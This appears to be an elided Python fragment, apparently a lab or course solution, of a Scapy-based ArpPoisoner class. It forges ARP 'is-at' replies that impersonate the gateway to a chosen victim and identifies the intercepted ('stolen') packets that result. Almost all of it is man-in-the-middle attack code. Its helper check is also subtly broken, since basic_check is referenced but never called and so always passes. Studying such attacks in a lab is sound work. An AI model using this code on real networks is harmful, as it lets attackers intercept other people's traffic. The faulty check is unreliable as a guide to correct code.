...
class ArpPoisoner(object):
    ...
    def is_packet_to_original_gateway(self, packet) -> bool:
        ...
        """
        return self.basic_check and self.gateway_mac == packet[S.Ether].dst
    ...
    def is_stolen_packet(self, packet) -> bool:
        ...
        Note: You may assume all packets have both IP and Ethernet layers.
        """
        return self.basic_check and self.our_mac == packet[S.Ether].dst
    ...
    def create_poison(self, victim_packet):
        ...
        2. Don't poison everyone on the network - poison only this specific
           victim.
        """
        return S.ARP(op="is-at", psrc=self.gateway_ip, pdst=victim_packet[S.IP].src, hwdst=victim_packet[S.Ether].src)

    def basic_check(self, packet):
        return packet.haslayer(S.IP) and self.our_ip != packet[S.IP].src 
